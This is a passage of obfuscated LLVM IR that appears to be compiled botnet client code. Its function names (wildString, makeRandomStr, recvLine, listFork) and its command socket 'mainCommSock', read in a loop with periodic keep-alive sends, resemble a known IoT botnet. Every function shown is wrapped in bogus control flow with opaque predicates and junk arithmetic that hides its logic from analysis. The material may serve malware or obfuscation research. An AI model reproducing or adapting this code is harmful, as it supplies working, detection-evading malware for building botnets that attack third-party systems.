  %_2 = shl i64 %42, 4
  %_3 = shl i64 %42, 4
  %_4 = shl i64 %42, 4
  %_5 = sub i64 %42, 4
  %gen6 = mul i64 %_5, 4
  %_7 = sub i64 %42, 4
  %gen8 = mul i64 %_7, 4
  %_9 = sub i64 %42, 4
  %gen10 = mul i64 %_9, 4
  %_11 = sub i64 %42, 4
  %gen12 = mul i64 %_11, 4
  %43 = shl i64 %42, 4
  %44 = load i8*, i8** %2, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %2, align 8
  %46 = load i8, i8* %44, align 1
  %47 = zext i8 %46 to i64
  %48 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %_13 = shl i64 %43, %49
  %_14 = sub i64 0, %43
  %gen15 = add i64 %_14, %49
  %_16 = sub i64 %43, %49
  %gen17 = mul i64 %_16, %49
  %_18 = shl i64 %43, %49
  %_19 = sub i64 0, %43
  %gen20 = add i64 %_19, %49
  %_21 = shl i64 %43, %49
  %50 = or i64 %43, %49
  store i64 %50, i64* %3, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %70 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %108

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %108

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @x.31
  %39 = load i32, i32* @y.32
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp ne i32 %48, 0
  %50 = load i32, i32* @x.31
  %51 = load i32, i32* @y.32
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %66

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = load i8*, i8** %4, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 1
  %61 = load i8*, i8** %5, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = call i32 @wildString(i8* %60, i8* %62)
  %64 = icmp ne i32 %63, 0
  %65 = xor i1 %64, true
  br label %66

; <label>:66:                                     ; preds = %58, %originalBBpart2
  %67 = phi i1 [ false, %originalBBpart2 ], [ %65, %58 ]
  %68 = xor i1 %67, true
  %69 = zext i1 %68 to i32
  store i32 %69, i32* %3, align 4
  br label %108

; <label>:70:                                     ; preds = %2
  %71 = load i8*, i8** %4, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = call i32 @toupper(i32 %73) #10
  %75 = load i8*, i8** %5, align 8
  %76 = load i8, i8* %75, align 1
  %77 = zext i8 %76 to i32
  %78 = call i32 @toupper(i32 %77) #10
  %79 = icmp eq i32 %74, %78
  br i1 %79, label %80, label %88

; <label>:80:                                     ; preds = %70
  %81 = load i8*, i8** %4, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 1
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  %85 = call i32 @wildString(i8* %82, i8* %84)
  %86 = icmp ne i32 %85, 0
  %87 = xor i1 %86, true
  br label %88

; <label>:88:                                     ; preds = %80, %70
  %89 = phi i1 [ false, %70 ], [ %87, %80 ]
  %90 = load i32, i32* @x.31
  %91 = load i32, i32* @y.32
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %98 = xor i1 %89, true
  %99 = zext i1 %98 to i32
  store i32 %99, i32* %3, align 4
  %100 = load i32, i32* @x.31
  %101 = load i32, i32* @y.32
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %108

; <label>:108:                                    ; preds = %originalBBpart24, %66, %33, %9
  %109 = load i32, i32* %3, align 4
  ret i32 %109

originalBBalteredBB:                              ; preds = %originalBB, %37
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp ne i32 %112, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %_ = sub i1 false, %89
  %gen = add i1 %_, true
  %114 = xor i1 %89, true
  %115 = zext i1 %114 to i32
  store i32 %115, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = load i32, i32* @x.33
  %3 = load i32, i32* @y.34
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i32, i32* @x.33
  %12 = load i32, i32* @y.34
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %19

; <label>:19:                                     ; preds = %originalBBpart28, %originalBBpart2
  %20 = load i32, i32* @x.33
  %21 = load i32, i32* @y.34
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = load i8, i8* %28, align 1
  %30 = icmp ne i8 %29, 0
  %31 = load i32, i32* @x.33
  %32 = load i32, i32* @y.34
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %30, label %39, label %64

; <label>:39:                                     ; preds = %originalBBpart24
  %40 = load i32, i32* @x.33
  %41 = load i32, i32* @y.34
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %39
  %48 = load i8*, i8** %10, align 8
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = call i32 @toupper(i32 %50) #10
  %52 = trunc i32 %51 to i8
  %53 = load i8*, i8** %10, align 8
  store i8 %52, i8* %53, align 1
  %54 = load i8*, i8** %10, align 8
  %55 = getelementptr inbounds i8, i8* %54, i32 1
  store i8* %55, i8** %10, align 8
  %56 = load i32, i32* @x.33
  %57 = load i32, i32* @y.34
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %19

; <label>:64:                                     ; preds = %originalBBpart24
  %65 = load i32, i32* @x.33
  %66 = load i32, i32* @y.34
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %64
  %73 = load i32, i32* @x.33
  %74 = load i32, i32* @y.34
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %81 = alloca i8*, align 8
  store i8* %0, i8** %81, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %19
  %82 = load i8*, i8** %10, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %39
  %85 = load i8*, i8** %10, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #10
  %89 = trunc i32 %88 to i8
  %90 = load i8*, i8** %10, align 8
  store i8 %89, i8* %90, align 1
  %91 = load i8*, i8** %10, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %10, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %64
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %51, %2
  %7 = load i32, i32* @x.35
  %8 = load i32, i32* @y.36
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %15, %16
  %18 = load i32, i32* @x.35
  %19 = load i32, i32* @y.36
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %54

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.35
  %28 = load i32, i32* @y.36
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = call i32 @rand_cmwc()
  %36 = urem i32 %35, 26
  %37 = add i32 %36, 65
  %38 = trunc i32 %37 to i8
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  store i8 %38, i8* %42, align 1
  %43 = load i32, i32* @x.35
  %44 = load i32, i32* @y.36
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %originalBBpart29
  %52 = load i32, i32* %5, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %5, align 4
  br label %6

; <label>:54:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %55 = load i32, i32* %5, align 4
  %56 = load i32, i32* %4, align 4
  %57 = icmp slt i32 %55, %56
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %58 = call i32 @rand_cmwc()
  %_ = sub i32 0, %58
  %gen = add i32 %_, 26
  %59 = urem i32 %58, 26
  %_2 = sub i32 %59, 65
  %gen3 = mul i32 %_2, 65
  %_4 = sub i32 %59, 65
  %gen5 = mul i32 %_4, 65
  %_6 = sub i32 0, %59
  %gen7 = add i32 %_6, 65
  %60 = add i32 %59, 65
  %61 = trunc i32 %60 to i8
  %62 = load i8*, i8** %3, align 8
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  store i8 %61, i8* %65, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.37
  %5 = load i32, i32* @y.38
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.__sigset_t, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.37
  %33 = load i32, i32* @y.38
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #2, !srcloc !2
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %13, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %55 = load i32, i32* %13, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %63, i32* %20, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %136

; <label>:65:                                     ; preds = %49
  br label %66

; <label>:66:                                     ; preds = %originalBBpart212, %65
  %67 = load i32, i32* %21, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %135

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = call i32 (i32, i8*, ...) @sockprintf(i32 %70, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0))
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %69
  %75 = load i32, i32* @x.37
  %76 = load i32, i32* @y.38
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %84 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 0
  %85 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %84) #2, !srcloc !3
  %86 = extractvalue { i64, i64* } %85, 0
  %87 = extractvalue { i64, i64* } %85, 1
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %22, align 4
  %89 = ptrtoint i64* %87 to i64
  %90 = trunc i64 %89 to i32
  store i32 %90, i32* %23, align 4
  %91 = load i32, i32* @x.37
  %92 = load i32, i32* @y.38
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %99

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* %13, align 4
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %105 = load i32, i32* %13, align 4
  %106 = sdiv i32 %105, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %104, i64 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %109, %103
  store i64 %110, i64* %108, align 8
  %111 = load i32, i32* %13, align 4
  %112 = add nsw i32 %111, 1
  %113 = call i32 @select(i32 %112, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %113, i32* %20, align 4
  %114 = icmp sle i32 %113, 0
  br i1 %114, label %115, label %134

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* @x.37
  %117 = load i32, i32* @y.38
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %115
  %124 = load i32, i32* %21, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %21, align 4
  %126 = load i32, i32* @x.37
  %127 = load i32, i32* @y.38
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart212, label %originalBB6alteredBB

originalBBpart212:                                ; preds = %originalBB6
  br label %66

; <label>:134:                                    ; preds = %99
  br label %135

; <label>:135:                                    ; preds = %134, %66
  br label %136

; <label>:136:                                    ; preds = %135, %49
  store i32 0, i32* %26, align 4
  %137 = load i8*, i8** %14, align 8
  store i8* %137, i8** %25, align 8
  br label %138

; <label>:138:                                    ; preds = %188, %136
  %139 = load i32, i32* %15, align 4
  %140 = add nsw i32 %139, -1
  store i32 %140, i32* %15, align 4
  %141 = icmp sgt i32 %139, 1
  br i1 %141, label %142, label %191

; <label>:142:                                    ; preds = %138
  %143 = load i32, i32* @x.37
  %144 = load i32, i32* @y.38
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %142
  %151 = load i32, i32* @mainCommSock, align 4
  %152 = call i64 @recv(i32 %151, i8* %24, i64 1, i32 0)
  %153 = icmp ne i64 %152, 1
  %154 = load i32, i32* @x.37
  %155 = load i32, i32* @y.38
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %153, label %162, label %164

; <label>:162:                                    ; preds = %originalBBpart216
  %163 = load i8*, i8** %25, align 8
  store i8 0, i8* %163, align 1
  store i32 -1, i32* %12, align 4
  br label %194

; <label>:164:                                    ; preds = %originalBBpart216
  %165 = load i32, i32* @x.37
  %166 = load i32, i32* @y.38
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %164
  %173 = load i8, i8* %24, align 1
  %174 = load i8*, i8** %25, align 8
  %175 = getelementptr inbounds i8, i8* %174, i32 1
  store i8* %175, i8** %25, align 8
  store i8 %173, i8* %174, align 1
  %176 = load i8, i8* %24, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 10
  %179 = load i32, i32* @x.37
  %180 = load i32, i32* @y.38
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %178, label %187, label %188

; <label>:187:                                    ; preds = %originalBBpart220
  br label %191

; <label>:188:                                    ; preds = %originalBBpart220
  %189 = load i32, i32* %26, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %26, align 4
  br label %138

; <label>:191:                                    ; preds = %187, %138
  %192 = load i8*, i8** %25, align 8
  store i8 0, i8* %192, align 1
  %193 = load i32, i32* %26, align 4
  store i32 %193, i32* %12, align 4
  br label %194

; <label>:194:                                    ; preds = %191, %162
  %195 = load i32, i32* %12, align 4
  ret i32 %195

originalBBalteredBB:                              ; preds = %originalBB, %3
  %196 = alloca i32, align 4
  %197 = alloca i32, align 4
  %198 = alloca i8*, align 8
  %199 = alloca i32, align 4
  %200 = alloca %struct.__sigset_t, align 8
  %201 = alloca %struct.timeval, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  %205 = alloca i32, align 4
  %206 = alloca i32, align 4
  %207 = alloca i32, align 4
  %208 = alloca i8, align 1
  %209 = alloca i8*, align 8
  %210 = alloca i32, align 4
  store i32 %0, i32* %197, align 4
  store i8* %1, i8** %198, align 8
  store i32 %2, i32* %199, align 4
  %211 = load i8*, i8** %198, align 8
  %212 = load i32, i32* %199, align 4
  %213 = sext i32 %212 to i64
  call void @llvm.memset.p0i8.i64(i8* %211, i8 0, i64 %213, i32 1, i1 false)
  %214 = getelementptr inbounds %struct.timeval, %struct.timeval* %201, i32 0, i32 0
  store i64 30, i64* %214, align 8
  %215 = getelementptr inbounds %struct.timeval, %struct.timeval* %201, i32 0, i32 1
  store i64 0, i64* %215, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %216 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %217 = getelementptr inbounds [16 x i64], [16 x i64]* %216, i64 0, i64 0
  %218 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %217) #2, !srcloc !3
  %219 = extractvalue { i64, i64* } %218, 0
  %220 = extractvalue { i64, i64* } %218, 1
  %221 = trunc i64 %219 to i32
  store i32 %221, i32* %22, align 4
  %222 = ptrtoint i64* %220 to i64
  %223 = trunc i64 %222 to i32
  store i32 %223, i32* %23, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %115
  %224 = load i32, i32* %21, align 4
  %_ = shl i32 %224, 1
  %_7 = sub i32 %224, 1
  %gen = mul i32 %_7, 1
  %_8 = shl i32 %224, 1
  %_9 = sub i32 %224, 1
  %gen10 = mul i32 %_9, 1
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %21, align 4
  br label %originalBB6

originalBB14alteredBB:                            ; preds = %originalBB14, %142
  %226 = load i32, i32* @mainCommSock, align 4
  %227 = call i64 @recv(i32 %226, i8* %24, i64 1, i32 0)
  %228 = icmp ne i64 %227, 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %164
  %229 = load i8, i8* %24, align 1
  %230 = load i8*, i8** %25, align 8
  %231 = getelementptr inbounds i8, i8* %230, i32 1
  store i8* %231, i8** %25, align 8
  store i8 %229, i8* %230, align 1
  %232 = load i8, i8* %24, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 10
  br label %originalBB18
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = load i32, i32* @x.39
  %2 = load i32, i32* @y.40
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = call i32 @fork() #2
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %10, align 4
  %15 = icmp ule i32 %14, 0
  %16 = load i32, i32* @x.39
  %17 = load i32, i32* @y.40
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
